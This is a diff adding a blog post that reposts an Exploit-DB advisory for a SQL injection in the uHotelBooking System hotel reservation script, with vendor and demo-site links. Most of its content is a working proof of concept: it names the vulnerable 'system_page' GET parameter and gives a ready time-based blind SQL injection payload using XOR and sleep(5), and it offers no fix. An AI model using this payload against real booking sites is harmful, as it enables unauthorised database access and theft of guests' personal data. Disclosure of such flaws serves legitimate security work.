@@ -1,0 +1,26 @@
+---
+layout:     post
+title:      "uHotelBooking System - 'system_page' SQL Injection"
+date:       2019-03-21 12:34
+author:     "Ahmet Ümit BAYRAM"
+category:   exploit
+tags:       [sql, sqli, sql injection, exploit-db]
+---
+
+# Exploit Title: uHotelBooking System - 'system_page' SQL Injection
+# Date: 21.03.2019
+# Exploit Author: Ahmet Ümit BAYRAM
+# Vendor Homepage: https://www.hotel-booking-script.com
+# Demo Site: https://www.hotel-booking-script.com/demo/
+# Version: Lastest
+# Tested on: Kali Linux
+# CVE: N/A
+# Description: uHotelBooking is a powerful hotel management and online
+booking/reservation site script.
+
+----- PoC: SQLi -----
+
+Request: http://localhost/[PATH]/index.php
+Vulnerable Parameter: system_page (GET)
+Attack Pattern:
+http://locahost/[PATH]/index.php?page=3&system_page=0'XOR(if(now()=sysdate()%2Csleep(5)%2C0))XOR'Z
